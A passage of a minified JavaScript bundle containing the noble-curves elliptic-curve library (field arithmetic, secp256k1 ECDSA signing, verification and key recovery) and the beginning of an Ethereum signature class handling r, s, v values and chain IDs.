Uint8Array(e/2);for(let n=0;n<r.length;n++){const i=n*2,s=t.slice(i,i+2),o=Number.parseInt(s,16);if(Number.isNaN(o)||o<0)throw new Error("Invalid byte sequence");r[n]=o}return r}function fc(t){return _2(eh(t))}function T2(t){if(!C1(t))throw new Error("Uint8Array expected");return _2(eh(Uint8Array.from(t).reverse()))}function rh(t,e){return th(t.toString(16).padStart(e*2,"0"))}function $2(t,e){return rh(t,e).reverse()}function $X(t){return th(_x(t))}function ni(t,e,r){let n;if(typeof e=="string")try{n=th(e)}catch(s){throw new Error(`${t} must be valid hex string, got "${e}". Cause: ${s}`)}else if(C1(e))n=Uint8Array.from(e);else throw new Error(`${t} must be hex string or Uint8Array`);const i=n.length;if(typeof r=="number"&&i!==r)throw new Error(`${t} expected ${r} bytes, got ${i}`);return n}function gf(...t){const e=new Uint8Array(t.reduce((n,i)=>n+i.length,0));let r=0;return t.forEach(n=>{if(!C1(n))throw new Error("Uint8Array expected");e.set(n,r),r+=n.length}),e}function RX(t,e){if(t.length!==e.length)return!1;for(let r=0;r<t.length;r++)if(t[r]!==e[r])return!1;return!0}function DX(t){if(typeof t!="string")throw new Error(`utf8ToBytes expected string, got ${typeof t}`);return new Uint8Array(new TextEncoder().encode(t))}function BX(t){let e;for(e=0;t>Ox;t>>=E1,e+=1);return e}function LX(t,e){return t>>BigInt(e)&E1}const UX=(t,e,r)=>t|(r?E1:Ox)<<BigInt(e),R2=t=>(_X<<BigInt(t-1))-E1,xm=t=>new Uint8Array(t),J8=t=>Uint8Array.from(t);function Tx(t,e,r){if(typeof t!="number"||t<2)throw new Error("hashLen must be a number");if(typeof e!="number"||e<2)throw new Error("qByteLen must be a number");if(typeof r!="function")throw new Error("hmacFn must be a function");let n=xm(t),i=xm(t),s=0;const o=()=>{n.fill(1),i.fill(0),s=0},a=(...h)=>r(i,n,...h),c=(h=xm())=>{i=a(J8([0]),h),n=a(),h.length!==0&&(i=a(J8([1]),h),n=a())},l=()=>{if(s++>=1e3)throw new Error("drbg: tried 1000 values");let h=0;const d=[];for(;h<e;){n=a();const f=n.slice();d.push(f),h+=n.length}return gf(...d)};return(h,d)=>{o(),c(h);let f;for(;!(f=d(l()));)c();return o(),f}}const MX={bigint:t=>typeof t=="bigint",function:t=>typeof t=="function",boolean:t=>typeof t=="boolean",string:t=>typeof t=="string",stringOrUint8Array:t=>typeof t=="string"||t instanceof Uint8Array,isSafeInteger:t=>Number.isSafeInteger(t),array:t=>Array.isArray(t),field:(t,e)=>e.Fp.isValid(t),hash:t=>typeof t=="function"&&Number.isSafeInteger(t.outputLen)};function op(t,e,r={}){const n=(i,s,o)=>{const a=MX[s];if(typeof a!="function")throw new Error(`Invalid validator "${s}", expected function`);const c=t[i];if(!(o&&c===void 0)&&!a(c,t))throw new Error(`Invalid param ${String(i)}=${c} (${typeof c}), expected ${s}`)};for(const[i,s]of Object.entries(e))n(i,s,!1);for(const[i,s]of Object.entries(r))n(i,s,!0);return t}const FX=Object.freeze(Object.defineProperty({__proto__:null,bitGet:LX,bitLen:BX,bitMask:R2,bitSet:UX,bytesToHex:eh,bytesToNumberBE:fc,bytesToNumberLE:T2,concatBytes:gf,createHmacDrbg:Tx,ensureBytes:ni,equalBytes:RX,hexToBytes:th,hexToNumber:_2,numberToBytesBE:rh,numberToBytesLE:$2,numberToHexUnpadded:_x,numberToVarBytesBE:$X,utf8ToBytes:DX,validateObject:op},Symbol.toStringTag,{value:"Module"}));/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const Yt=BigInt(0),Pt=BigInt(1),ka=BigInt(2),zX=BigInt(3),sb=BigInt(4),Q8=BigInt(5),Y8=BigInt(8);BigInt(9);BigInt(16);function Vr(t,e){const r=t%e;return r>=Yt?r:e+r}function jX(t,e,r){if(r<=Yt||e<Yt)throw new Error("Expected power/modulo > 0");if(r===Pt)return Yt;let n=Pt;for(;e>Yt;)e&Pt&&(n=n*t%r),t=t*t%r,e>>=Pt;return n}function On(t,e,r){let n=t;for(;e-- >Yt;)n*=n,n%=r;return n}function ob(t,e){if(t===Yt||e<=Yt)throw new Error(`invert: expected positive integers, got n=${t} mod=${e}`);let r=Vr(t,e),n=e,i=Yt,s=Pt;for(;r!==Yt;){const a=n/r,c=n%r,l=i-s*a;n=r,r=c,i=s,s=l}if(n!==Pt)throw new Error("invert: does not exist");return Vr(i,e)}function HX(t){const e=(t-Pt)/ka;let r,n,i;for(r=t-Pt,n=0;r%ka===Yt;r/=ka,n++);for(i=ka;i<t&&jX(i,e,t)!==t-Pt;i++);if(n===1){const o=(t+Pt)/sb;return function(c,l){const u=c.pow(l,o);if(!c.eql(c.sqr(u),l))throw new Error("Cannot find square root");return u}}const s=(r+Pt)/ka;return function(a,c){if(a.pow(c,e)===a.neg(a.ONE))throw new Error("Cannot find square root");let l=n,u=a.pow(a.mul(a.ONE,i),r),h=a.pow(c,s),d=a.pow(c,r);for(;!a.eql(d,a.ONE);){if(a.eql(d,a.ZERO))return a.ZERO;let f=1;for(let p=a.sqr(d);f<l&&!a.eql(p,a.ONE);f++)p=a.sqr(p);const g=a.pow(u,Pt<<BigInt(l-f-1));u=a.sqr(g),h=a.mul(h,g),d=a.mul(d,u),l=f}return h}}function qX(t){if(t%sb===zX){const e=(t+Pt)/sb;return function(n,i){const s=n.pow(i,e);if(!n.eql(n.sqr(s),i))throw new Error("Cannot find square root");return s}}if(t%Y8===Q8){const e=(t-Q8)/Y8;return function(n,i){const s=n.mul(i,ka),o=n.pow(s,e),a=n.mul(i,o),c=n.mul(n.mul(a,ka),o),l=n.mul(a,n.sub(c,n.ONE));if(!n.eql(n.sqr(l),i))throw new Error("Cannot find square root");return l}}return HX(t)}const VX=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function WX(t){const e={ORDER:"bigint",MASK:"bigint",BYTES:"isSafeInteger",BITS:"isSafeInteger"},r=VX.reduce((n,i)=>(n[i]="function",n),e);return op(t,r)}function GX(t,e,r){if(r<Yt)throw new Error("Expected power > 0");if(r===Yt)return t.ONE;if(r===Pt)return e;let n=t.ONE,i=e;for(;r>Yt;)r&Pt&&(n=t.mul(n,i)),i=t.sqr(i),r>>=Pt;return n}function KX(t,e){const r=new Array(e.length),n=e.reduce((s,o,a)=>t.is0(o)?s:(r[a]=s,t.mul(s,o)),t.ONE),i=t.inv(n);return e.reduceRight((s,o,a)=>t.is0(o)?s:(r[a]=t.mul(s,r[a]),t.mul(s,o)),i),r}function $x(t,e){const r=e!==void 0?e:t.toString(2).length,n=Math.ceil(r/8);return{nBitLength:r,nByteLength:n}}function ZX(t,e,r=!1,n={}){if(t<=Yt)throw new Error(`Expected Field ORDER > 0, got ${t}`);const{nBitLength:i,nByteLength:s}=$x(t,e);if(s>2048)throw new Error("Field lengths over 2048 bytes are not supported");const o=qX(t),a=Object.freeze({ORDER:t,BITS:i,BYTES:s,MASK:R2(i),ZERO:Yt,ONE:Pt,create:c=>Vr(c,t),isValid:c=>{if(typeof c!="bigint")throw new Error(`Invalid field element: expected bigint, got ${typeof c}`);return Yt<=c&&c<t},is0:c=>c===Yt,isOdd:c=>(c&Pt)===Pt,neg:c=>Vr(-c,t),eql:(c,l)=>c===l,sqr:c=>Vr(c*c,t),add:(c,l)=>Vr(c+l,t),sub:(c,l)=>Vr(c-l,t),mul:(c,l)=>Vr(c*l,t),pow:(c,l)=>GX(a,c,l),div:(c,l)=>Vr(c*ob(l,t),t),sqrN:c=>c*c,addN:(c,l)=>c+l,subN:(c,l)=>c-l,mulN:(c,l)=>c*l,inv:c=>ob(c,t),sqrt:n.sqrt||(c=>o(a,c)),invertBatch:c=>KX(a,c),cmov:(c,l,u)=>u?l:c,toBytes:c=>r?$2(c,s):rh(c,s),fromBytes:c=>{if(c.length!==s)throw new Error(`Fp.fromBytes: expected ${s}, got ${c.length}`);return r?T2(c):fc(c)}});return Object.freeze(a)}function Rx(t){if(typeof t!="bigint")throw new Error("field order must be bigint");const e=t.toString(2).length;return Math.ceil(e/8)}function Dx(t){const e=Rx(t);return e+Math.ceil(e/2)}function JX(t,e,r=!1){const n=t.length,i=Rx(e),s=Dx(e);if(n<16||n<s||n>1024)throw new Error(`expected ${s}-1024 bytes of input, got ${n}`);const o=r?fc(t):T2(t),a=Vr(o,e-Pt)+Pt;return r?$2(a,i):rh(a,i)}/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const QX=BigInt(0),Im=BigInt(1);function YX(t,e){const r=(i,s)=>{const o=s.negate();return i?o:s},n=i=>{const s=Math.ceil(e/i)+1,o=2**(i-1);return{windows:s,windowSize:o}};return{constTimeNegate:r,unsafeLadder(i,s){let o=t.ZERO,a=i;for(;s>QX;)s&Im&&(o=o.add(a)),a=a.double(),s>>=Im;return o},precomputeWindow(i,s){const{windows:o,windowSize:a}=n(s),c=[];let l=i,u=l;for(let h=0;h<o;h++){u=l,c.push(u);for(let d=1;d<a;d++)u=u.add(l),c.push(u);l=u.double()}return c},wNAF(i,s,o){const{windows:a,windowSize:c}=n(i);let l=t.ZERO,u=t.BASE;const h=BigInt(2**i-1),d=2**i,f=BigInt(i);for(let g=0;g<a;g++){const p=g*c;let w=Number(o&h);o>>=f,w>c&&(w-=d,o+=Im);const m=p,b=p+Math.abs(w)-1,v=g%2!==0,x=w<0;w===0?u=u.add(r(v,s[m])):l=l.add(r(x,s[b]))}return{p:l,f:u}},wNAFCached(i,s,o,a){const c=i._WINDOW_SIZE||1;let l=s.get(i);return l||(l=this.precomputeWindow(i,c),c!==1&&s.set(i,a(l))),this.wNAF(c,l,o)}}}function Bx(t){return WX(t.Fp),op(t,{n:"bigint",h:"bigint",Gx:"field",Gy:"field"},{nBitLength:"isSafeInteger",nByteLength:"isSafeInteger"}),Object.freeze({...$x(t.n,t.nBitLength),...t,p:t.Fp.ORDER})}/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */function XX(t){const e=Bx(t);op(e,{a:"field",b:"field"},{allowedPrivateKeyLengths:"array",wrapPrivateKey:"boolean",isTorsionFree:"function",clearCofactor:"function",allowInfinityPoint:"boolean",fromBytes:"function",toBytes:"function"});const{endo:r,Fp:n,a:i}=e;if(r){if(!n.eql(i,n.ZERO))throw new Error("Endomorphism can only be defined for Koblitz curves that have a=0");if(typeof r!="object"||typeof r.beta!="bigint"||typeof r.splitScalar!="function")throw new Error("Expected endomorphism with beta: bigint and splitScalar: function")}return Object.freeze({...e})}const{bytesToNumberBE:eee,hexToBytes:tee}=FX,La={Err:class extends Error{constructor(e=""){super(e)}},_parseInt(t){const{Err:e}=La;if(t.length<2||t[0]!==2)throw new e("Invalid signature integer tag");const r=t[1],n=t.subarray(2,r+2);if(!r||n.length!==r)throw new e("Invalid signature integer: wrong length");if(n[0]&128)throw new e("Invalid signature integer: negative");if(n[0]===0&&!(n[1]&128))throw new e("Invalid signature integer: unnecessary leading zero");return{d:eee(n),l:t.subarray(r+2)}},toSig(t){const{Err:e}=La,r=typeof t=="string"?tee(t):t;if(!(r instanceof Uint8Array))throw new Error("ui8a expected");let n=r.length;if(n<2||r[0]!=48)throw new e("Invalid signature tag");if(r[1]!==n-2)throw new e("Invalid signature: incorrect length");const{d:i,l:s}=La._parseInt(r.subarray(2)),{d:o,l:a}=La._parseInt(s);if(a.length)throw new e("Invalid signature: left bytes after parsing");return{r:i,s:o}},hexFromSig(t){const e=l=>Number.parseInt(l[0],16)&8?"00"+l:l,r=l=>{const u=l.toString(16);return u.length&1?`0${u}`:u},n=e(r(t.s)),i=e(r(t.r)),s=n.length/2,o=i.length/2,a=r(s),c=r(o);return`30${r(o+s+4)}02${c}${i}02${a}${n}`}},Rs=BigInt(0),Fn=BigInt(1);BigInt(2);const X8=BigInt(3);BigInt(4);function ree(t){const e=XX(t),{Fp:r}=e,n=e.toBytes||((g,p,w)=>{const m=p.toAffine();return gf(Uint8Array.from([4]),r.toBytes(m.x),r.toBytes(m.y))}),i=e.fromBytes||(g=>{const p=g.subarray(1),w=r.fromBytes(p.subarray(0,r.BYTES)),m=r.fromBytes(p.subarray(r.BYTES,2*r.BYTES));return{x:w,y:m}});function s(g){const{a:p,b:w}=e,m=r.sqr(g),b=r.mul(m,g);return r.add(r.add(b,r.mul(g,p)),w)}if(!r.eql(r.sqr(e.Gy),s(e.Gx)))throw new Error("bad generator point: equation left != right");function o(g){return typeof g=="bigint"&&Rs<g&&g<e.n}function a(g){if(!o(g))throw new Error("Expected valid bigint: 0 < bigint < curve.n")}function c(g){const{allowedPrivateKeyLengths:p,nByteLength:w,wrapPrivateKey:m,n:b}=e;if(p&&typeof g!="bigint"){if(g instanceof Uint8Array&&(g=eh(g)),typeof g!="string"||!p.includes(g.length))throw new Error("Invalid key");g=g.padStart(w*2,"0")}let v;try{v=typeof g=="bigint"?g:fc(ni("private key",g,w))}catch{throw new Error(`private key must be ${w} bytes, hex or bigint, not ${typeof g}`)}return m&&(v=Vr(v,b)),a(v),v}const l=new Map;function u(g){if(!(g instanceof h))throw new Error("ProjectivePoint expected")}class h{constructor(p,w,m){if(this.px=p,this.py=w,this.pz=m,p==null||!r.isValid(p))throw new Error("x required");if(w==null||!r.isValid(w))throw new Error("y required");if(m==null||!r.isValid(m))throw new Error("z required")}static fromAffine(p){const{x:w,y:m}=p||{};if(!p||!r.isValid(w)||!r.isValid(m))throw new Error("invalid affine point");if(p instanceof h)throw new Error("projective point not allowed");const b=v=>r.eql(v,r.ZERO);return b(w)&&b(m)?h.ZERO:new h(w,m,r.ONE)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static normalizeZ(p){const w=r.invertBatch(p.map(m=>m.pz));return p.map((m,b)=>m.toAffine(w[b])).map(h.fromAffine)}static fromHex(p){const w=h.fromAffine(i(ni("pointHex",p)));return w.assertValidity(),w}static fromPrivateKey(p){return h.BASE.multiply(c(p))}_setWindowSize(p){this._WINDOW_SIZE=p,l.delete(this)}assertValidity(){if(this.is0()){if(e.allowInfinityPoint&&!r.is0(this.py))return;throw new Error("bad point: ZERO")}const{x:p,y:w}=this.toAffine();if(!r.isValid(p)||!r.isValid(w))throw new Error("bad point: x or y not FE");const m=r.sqr(w),b=s(p);if(!r.eql(m,b))throw new Error("bad point: equation left != right");if(!this.isTorsionFree())throw new Error("bad point: not in prime-order subgroup")}hasEvenY(){const{y:p}=this.toAffine();if(r.isOdd)return!r.isOdd(p);throw new Error("Field doesn't support isOdd")}equals(p){u(p);const{px:w,py:m,pz:b}=this,{px:v,py:x,pz:I}=p,C=r.eql(r.mul(w,I),r.mul(v,b)),N=r.eql(r.mul(m,I),r.mul(x,b));return C&&N}negate(){return new h(this.px,r.neg(this.py),this.pz)}double(){const{a:p,b:w}=e,m=r.mul(w,X8),{px:b,py:v,pz:x}=this;let I=r.ZERO,C=r.ZERO,N=r.ZERO,S=r.mul(b,b),P=r.mul(v,v),T=r.mul(x,x),D=r.mul(b,v);return D=r.add(D,D),N=r.mul(b,x),N=r.add(N,N),I=r.mul(p,N),C=r.mul(m,T),C=r.add(I,C),I=r.sub(P,C),C=r.add(P,C),C=r.mul(I,C),I=r.mul(D,I),N=r.mul(m,N),T=r.mul(p,T),D=r.sub(S,T),D=r.mul(p,D),D=r.add(D,N),N=r.add(S,S),S=r.add(N,S),S=r.add(S,T),S=r.mul(S,D),C=r.add(C,S),T=r.mul(v,x),T=r.add(T,T),S=r.mul(T,D),I=r.sub(I,S),N=r.mul(T,P),N=r.add(N,N),N=r.add(N,N),new h(I,C,N)}add(p){u(p);const{px:w,py:m,pz:b}=this,{px:v,py:x,pz:I}=p;let C=r.ZERO,N=r.ZERO,S=r.ZERO;const P=e.a,T=r.mul(e.b,X8);let D=r.mul(w,v),z=r.mul(m,x),V=r.mul(b,I),O=r.add(w,m),y=r.add(v,x);O=r.mul(O,y),y=r.add(D,z),O=r.sub(O,y),y=r.add(w,b);let E=r.add(v,I);return y=r.mul(y,E),E=r.add(D,V),y=r.sub(y,E),E=r.add(m,b),C=r.add(x,I),E=r.mul(E,C),C=r.add(z,V),E=r.sub(E,C),S=r.mul(P,y),C=r.mul(T,V),S=r.add(C,S),C=r.sub(z,S),S=r.add(z,S),N=r.mul(C,S),z=r.add(D,D),z=r.add(z,D),V=r.mul(P,V),y=r.mul(T,y),z=r.add(z,V),V=r.sub(D,V),V=r.mul(P,V),y=r.add(y,V),D=r.mul(z,y),N=r.add(N,D),D=r.mul(E,y),C=r.mul(O,C),C=r.sub(C,D),D=r.mul(O,z),S=r.mul(E,S),S=r.add(S,D),new h(C,N,S)}subtract(p){return this.add(p.negate())}is0(){return this.equals(h.ZERO)}wNAF(p){return f.wNAFCached(this,l,p,w=>{const m=r.invertBatch(w.map(b=>b.pz));return w.map((b,v)=>b.toAffine(m[v])).map(h.fromAffine)})}multiplyUnsafe(p){const w=h.ZERO;if(p===Rs)return w;if(a(p),p===Fn)return this;const{endo:m}=e;if(!m)return f.unsafeLadder(this,p);let{k1neg:b,k1:v,k2neg:x,k2:I}=m.splitScalar(p),C=w,N=w,S=this;for(;v>Rs||I>Rs;)v&Fn&&(C=C.add(S)),I&Fn&&(N=N.add(S)),S=S.double(),v>>=Fn,I>>=Fn;return b&&(C=C.negate()),x&&(N=N.negate()),N=new h(r.mul(N.px,m.beta),N.py,N.pz),C.add(N)}multiply(p){a(p);let w=p,m,b;const{endo:v}=e;if(v){const{k1neg:x,k1:I,k2neg:C,k2:N}=v.splitScalar(w);let{p:S,f:P}=this.wNAF(I),{p:T,f:D}=this.wNAF(N);S=f.constTimeNegate(x,S),T=f.constTimeNegate(C,T),T=new h(r.mul(T.px,v.beta),T.py,T.pz),m=S.add(T),b=P.add(D)}else{const{p:x,f:I}=this.wNAF(w);m=x,b=I}return h.normalizeZ([m,b])[0]}multiplyAndAddUnsafe(p,w,m){const b=h.BASE,v=(I,C)=>C===Rs||C===Fn||!I.equals(b)?I.multiplyUnsafe(C):I.multiply(C),x=v(this,w).add(v(p,m));return x.is0()?void 0:x}toAffine(p){const{px:w,py:m,pz:b}=this,v=this.is0();p==null&&(p=v?r.ONE:r.inv(b));const x=r.mul(w,p),I=r.mul(m,p),C=r.mul(b,p);if(v)return{x:r.ZERO,y:r.ZERO};if(!r.eql(C,r.ONE))throw new Error("invZ was invalid");return{x,y:I}}isTorsionFree(){const{h:p,isTorsionFree:w}=e;if(p===Fn)return!0;if(w)return w(h,this);throw new Error("isTorsionFree() has not been declared for the elliptic curve")}clearCofactor(){const{h:p,clearCofactor:w}=e;return p===Fn?this:w?w(h,this):this.multiplyUnsafe(e.h)}toRawBytes(p=!0){return this.assertValidity(),n(h,this,p)}toHex(p=!0){return eh(this.toRawBytes(p))}}h.BASE=new h(e.Gx,e.Gy,r.ONE),h.ZERO=new h(r.ZERO,r.ONE,r.ZERO);const d=e.nBitLength,f=YX(h,e.endo?Math.ceil(d/2):d);return{CURVE:e,ProjectivePoint:h,normPrivateKeyToScalar:c,weierstrassEquation:s,isWithinCurveOrder:o}}function nee(t){const e=Bx(t);return op(e,{hash:"hash",hmac:"function",randomBytes:"function"},{bits2int:"function",bits2int_modN:"function",lowS:"boolean"}),Object.freeze({lowS:!0,...e})}function iee(t){const e=nee(t),{Fp:r,n}=e,i=r.BYTES+1,s=2*r.BYTES+1;function o(y){return Rs<y&&y<r.ORDER}function a(y){return Vr(y,n)}function c(y){return ob(y,n)}const{ProjectivePoint:l,normPrivateKeyToScalar:u,weierstrassEquation:h,isWithinCurveOrder:d}=ree({...e,toBytes(y,E,k){const _=E.toAffine(),R=r.toBytes(_.x),L=gf;return k?L(Uint8Array.from([E.hasEvenY()?2:3]),R):L(Uint8Array.from([4]),R,r.toBytes(_.y))},fromBytes(y){const E=y.length,k=y[0],_=y.subarray(1);if(E===i&&(k===2||k===3)){const R=fc(_);if(!o(R))throw new Error("Point is not on curve");const L=h(R);let q=r.sqrt(L);const W=(q&Fn)===Fn;return(k&1)===1!==W&&(q=r.neg(q)),{x:R,y:q}}else if(E===s&&k===4){const R=r.fromBytes(_.subarray(0,r.BYTES)),L=r.fromBytes(_.subarray(r.BYTES,2*r.BYTES));return{x:R,y:L}}else throw new Error(`Point of length ${E} was invalid. Expected ${i} compressed bytes or ${s} uncompressed bytes`)}}),f=y=>eh(rh(y,e.nByteLength));function g(y){const E=n>>Fn;return y>E}function p(y){return g(y)?a(-y):y}const w=(y,E,k)=>fc(y.slice(E,k));class m{constructor(E,k,_){this.r=E,this.s=k,this.recovery=_,this.assertValidity()}static fromCompact(E){const k=e.nByteLength;return E=ni("compactSignature",E,k*2),new m(w(E,0,k),w(E,k,2*k))}static fromDER(E){const{r:k,s:_}=La.toSig(ni("DER",E));return new m(k,_)}assertValidity(){if(!d(this.r))throw new Error("r must be 0 < r < CURVE.n");if(!d(this.s))throw new Error("s must be 0 < s < CURVE.n")}addRecoveryBit(E){return new m(this.r,this.s,E)}recoverPublicKey(E){const{r:k,s:_,recovery:R}=this,L=N(ni("msgHash",E));if(R==null||![0,1,2,3].includes(R))throw new Error("recovery id invalid");const q=R===2||R===3?k+e.n:k;if(q>=r.ORDER)throw new Error("recovery id 2 or 3 invalid");const W=(R&1)===0?"02":"03",Z=l.fromHex(W+f(q)),G=c(q),ne=a(-L*G),de=a(_*G),Se=l.BASE.multiplyAndAddUnsafe(Z,ne,de);if(!Se)throw new Error("point at infinify");return Se.assertValidity(),Se}hasHighS(){return g(this.s)}normalizeS(){return this.hasHighS()?new m(this.r,a(-this.s),this.recovery):this}toDERRawBytes(){return th(this.toDERHex())}toDERHex(){return La.hexFromSig({r:this.r,s:this.s})}toCompactRawBytes(){return th(this.toCompactHex())}toCompactHex(){return f(this.r)+f(this.s)}}const b={isValidPrivateKey(y){try{return u(y),!0}catch{return!1}},normPrivateKeyToScalar:u,randomPrivateKey:()=>{const y=Dx(e.n);return JX(e.randomBytes(y),e.n)},precompute(y=8,E=l.BASE){return E._setWindowSize(y),E.multiply(BigInt(3)),E}};function v(y,E=!0){return l.fromPrivateKey(y).toRawBytes(E)}function x(y){const E=y instanceof Uint8Array,k=typeof y=="string",_=(E||k)&&y.length;return E?_===i||_===s:k?_===2*i||_===2*s:y instanceof l}function I(y,E,k=!0){if(x(y))throw new Error("first arg must be private key");if(!x(E))throw new Error("second arg must be public key");return l.fromHex(E).multiply(u(y)).toRawBytes(k)}const C=e.bits2int||function(y){const E=fc(y),k=y.length*8-e.nBitLength;return k>0?E>>BigInt(k):E},N=e.bits2int_modN||function(y){return a(C(y))},S=R2(e.nBitLength);function P(y){if(typeof y!="bigint")throw new Error("bigint expected");if(!(Rs<=y&&y<S))throw new Error(`bigint expected < 2^${e.nBitLength}`);return rh(y,e.nByteLength)}function T(y,E,k=D){if(["recovered","canonical"].some(be=>be in k))throw new Error("sign() legacy options not supported");const{hash:_,randomBytes:R}=e;let{lowS:L,prehash:q,extraEntropy:W}=k;L==null&&(L=!0),y=ni("msgHash",y),q&&(y=ni("prehashed msgHash",_(y)));const Z=N(y),G=u(E),ne=[P(G),P(Z)];if(W!=null){const be=W===!0?R(r.BYTES):W;ne.push(ni("extraEntropy",be))}const de=gf(...ne),Se=Z;function Ne(be){const ke=C(be);if(!d(ke))return;const Me=c(ke),Ue=l.BASE.multiply(ke).toAffine(),Le=a(Ue.x);if(Le===Rs)return;const wt=a(Me*a(Se+Le*G));if(wt===Rs)return;let bn=(Ue.x===Le?0:2)|Number(Ue.y&Fn),hp=wt;return L&&g(wt)&&(hp=p(wt),bn^=1),new m(Le,hp,bn)}return{seed:de,k2sig:Ne}}const D={lowS:e.lowS,prehash:!1},z={lowS:e.lowS,prehash:!1};function V(y,E,k=D){const{seed:_,k2sig:R}=T(y,E,k),L=e;return Tx(L.hash.outputLen,L.nByteLength,L.hmac)(_,R)}l.BASE._setWindowSize(8);function O(y,E,k,_=z){var Ue;const R=y;if(E=ni("msgHash",E),k=ni("publicKey",k),"strict"in _)throw new Error("options.strict was renamed to lowS");const{lowS:L,prehash:q}=_;let W,Z;try{if(typeof R=="string"||R instanceof Uint8Array)try{W=m.fromDER(R)}catch(Le){if(!(Le instanceof La.Err))throw Le;W=m.fromCompact(R)}else if(typeof R=="object"&&typeof R.r=="bigint"&&typeof R.s=="bigint"){const{r:Le,s:wt}=R;W=new m(Le,wt)}else throw new Error("PARSE");Z=l.fromHex(k)}catch(Le){if(Le.message==="PARSE")throw new Error("signature must be Signature instance, Uint8Array or hex string");return!1}if(L&&W.hasHighS())return!1;q&&(E=e.hash(E));const{r:G,s:ne}=W,de=N(E),Se=c(ne),Ne=a(de*Se),be=a(G*Se),ke=(Ue=l.BASE.multiplyAndAddUnsafe(Z,Ne,be))==null?void 0:Ue.toAffine();return ke?a(ke.x)===G:!1}return{CURVE:e,getPublicKey:v,getSharedSecret:I,sign:V,verify:O,ProjectivePoint:l,Signature:m,utils:b}}/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */function see(t){return{hash:t,hmac:(e,...r)=>dx(t,e,WY(...r)),randomBytes:GY}}function oee(t,e){const r=n=>iee({...t,...see(n)});return Object.freeze({...r(e),create:r})}/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const Lx=BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f"),e6=BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141"),aee=BigInt(1),ab=BigInt(2),t6=(t,e)=>(t+e/ab)/e;function cee(t){const e=Lx,r=BigInt(3),n=BigInt(6),i=BigInt(11),s=BigInt(22),o=BigInt(23),a=BigInt(44),c=BigInt(88),l=t*t*t%e,u=l*l*t%e,h=On(u,r,e)*u%e,d=On(h,r,e)*u%e,f=On(d,ab,e)*l%e,g=On(f,i,e)*f%e,p=On(g,s,e)*g%e,w=On(p,a,e)*p%e,m=On(w,c,e)*w%e,b=On(m,a,e)*p%e,v=On(b,r,e)*u%e,x=On(v,o,e)*g%e,I=On(x,n,e)*l%e,C=On(I,ab,e);if(!cb.eql(cb.sqr(C),t))throw new Error("Cannot find square root");return C}const cb=ZX(Lx,void 0,void 0,{sqrt:cee}),ao=oee({a:BigInt(0),b:BigInt(7),Fp:cb,n:e6,Gx:BigInt("55066263022277343669578718895168534326250603453777594175500187360389116729240"),Gy:BigInt("32670510020758816978083085130507043184471273380659243275938904335757337482424"),h:BigInt(1),lowS:!0,endo:{beta:BigInt("0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"),splitScalar:t=>{const e=e6,r=BigInt("0x3086d221a7d46bcde86c90e49284eb15"),n=-aee*BigInt("0xe4437ed6010e88286f547fa90abfe4c3"),i=BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8"),s=r,o=BigInt("0x100000000000000000000000000000000"),a=t6(s*t,e),c=t6(-n*t,e);let l=Vr(t-a*r-c*i,e),u=Vr(-a*n-c*s,e);const h=l>o,d=u>o;if(h&&(l=e-l),d&&(u=e-u),l>o||u>o)throw new Error("splitScalar: Endomorphism failed, k="+t);return{k1neg:h,k1:l,k2neg:d,k2:u}}}},px);BigInt(0);ao.ProjectivePoint;const wf="0x0000000000000000000000000000000000000000",r6="0x0000000000000000000000000000000000000000000000000000000000000000";BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141");BigInt("1000000000000000000");const lee=BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");BigInt("0x8000000000000000000000000000000000000000000000000000000000000000")*BigInt(-1);BigInt("0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");const n6=BigInt(0),i6=BigInt(1),s6=BigInt(2),o6=BigInt(27),a6=BigInt(28),A0=BigInt(35),ml={};function c6(t){return kc(Ir(t),32)}var iu,su,ou,Za;const ti=class ti{constructor(e,r,n,i){H(this,iu);H(this,su);H(this,ou);H(this,Za);sp(e,ml,"Signature"),$(this,iu,r),$(this,su,n),$(this,ou,i),$(this,Za,null)}get r(){return A(this,iu)}set r(e){M(Wl(e)===32,"invalid r","value",e),$(this,iu,ue(e))}get s(){return A(this,su)}set s(e){M(Wl(e)===32,"invalid s","value",e);const r=ue(e);M(parseInt(r.substring(0,3))<8,"non-canonical s","value",r),$(this,su,r)}get v(){return A(this,ou)}set v(e){const r=Re(e,"value");M(r===27||r===28,"invalid v","v",e),$(this,ou,r)}get networkV(){return A(this,Za)}get legacyChainId(){const e=this.networkV;return e==null?null:ti.getChainId(e)}get yParity(){return this.v===27?0:1}get yParityAndS(){const e=Ve(this.s);return this.yParity&&(e[0]|=128),ue(e)}get compactSerialized(){return Ot([this.r,this.yParityAndS])}get serialized(){return Ot([this.r,this.s,this.yParity?"0x1c":"0x1b"])}[Symbol.for("nodejs.util.inspect.custom")](){return`Signature { r: "${this.r}", s: "${this.s}", yParity: ${this.yParity}, networkV: ${this.networkV} }`}clone(){const e=new ti(ml,this.r,this.s,this.v);return this.networkV&&$(e,Za,this.networkV),e}toJSON(){const e=this.networkV;return{_type:"signature",networkV:e!=null?e.toString():null,r:this.r,s:this.s,v:this.v}}static getChainId(e){const r=ge(e,"v");return r==o6||r==a6?n6:(M(r>=A0,"invalid EIP-155 v","v",e),(r-A0)/s6)}static getChainIdV(e,r){return ge(e)*s6+BigInt(35+r-27)}static getNormalizedV(e){const r=ge(e);return r===n6||r===o6?27:r===i6||r===a6?28:(M(r>=A0,"invalid v","v",e),r&i6?27:28)}static from(e){function r(l,u){M(l,u,"signature",e)}if(e==null)return new ti(ml,r6,r6,27);if(typeof e=="string"){const l=Ve(e,"signature");if(l.length===64){const u=ue(l.slice(0,32)),h=l.slice(32,64),d=h[0]&128?28:27;return h[0]&=127,new 